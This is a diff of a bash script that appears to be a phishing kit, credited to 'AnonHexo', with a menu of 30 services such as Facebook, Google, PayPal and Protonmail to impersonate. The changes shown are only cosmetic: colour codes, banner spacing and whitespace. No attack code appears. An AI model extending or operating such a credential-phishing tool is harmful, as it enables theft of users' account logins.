@@ -5,7 +5,7 @@ RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033
 MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
 REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
 MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
-RESETBG="$(printf '')"
+RESETBG="$(printf '\e[0m')"
 
 ## Directories
 if [[ ! -d ".server" ]]; then
@@ -51,22 +51,22 @@ kill_pid() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${ORANGE} ▄███▄   ▄▄▄▄▄▄   █ ▄▄   ▄  █ ▄█    ▄▄▄▄▄    ▄  █ ▄███▄   █▄▄▄▄ 
-		${ORANGE} █▀   ▀ ▀   ▄▄▀   █   █ █   █ ██   █     ▀▄ █   █ █▀   ▀  █  ▄▀ 
-		${ORANGE} ██▄▄    ▄▀▀   ▄▀ █▀▀▀  ██▀▀█ ██ ▄  ▀▀▀▀▄   ██▀▀█ ██▄▄    █▀▀▌  
-		${ORANGE} █▄   ▄▀ ▀▀▀▀▀▀   █     █   █ ▐█  ▀▄▄▄▄▀    █   █ █▄   ▄▀ █  █  
-		${ORANGE} ▀███▀             █       █   ▐               █  ▀███▀     █   
-            		   ▀     ▀                   ▀            ▀    
-				${GREEN}[-] Tool Developed by AnonHexo${WHITE}
+		${ORANGE} 		▄███▄   ▄▄▄▄▄▄   █ ▄▄   ▄  █ ▄█    ▄▄▄▄▄    ▄  █ ▄███▄   █▄▄▄▄ 
+		${ORANGE} 		█▀   ▀ ▀   ▄▄▀   █   █ █   █ ██   █     ▀▄ █   █ █▀   ▀  █  ▄▀ 
+		${ORANGE} 		██▄▄    ▄▀▀   ▄▀ █▀▀▀  ██▀▀█ ██ ▄  ▀▀▀▀▄   ██▀▀█ ██▄▄    █▀▀▌  
+		${ORANGE} 		█▄   ▄▀ ▀▀▀▀▀▀   █     █   █ ▐█  ▀▄▄▄▄▀    █   █ █▄   ▄▀ █  █  
+		${ORANGE} 		▀███▀             █       █   ▐               █  ▀███▀     █   
+											 ▀     ▀                   ▀            ▀    
+				${GREEN}		[-] Tool Developed by AnonHexo${WHITE}
 	EOF
 }
 
 ## Small Banner
 banner_small() {
 	cat <<- EOF
-	${ORANGE}█▀▀ ▀█ █▀█ █ █ █ █▀ █ █ █▀▀ █▀█
-	${ORANGE}██▄ █▄ █▀▀ █▀█ █ ▄█ █▀█ ██▄ █▀▄
-                                ${WHITE} v1.1
+	${ORANGE}		█▀▀ ▀█ █▀█ █ █ █ █▀ █ █ █▀▀ █▀█
+	${ORANGE}		██▄ █▄ █▀▀ █▀█ █ ▄█ █▀█ ██▄ █▀▄
+                                ${WHITE} 	v1.1
 	EOF
 }
 
@@ -419,10 +419,10 @@ main_menu() {
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
 		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
-		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox
-		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo
+		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
+		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
 		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
-		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex
+		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
 		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
 		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
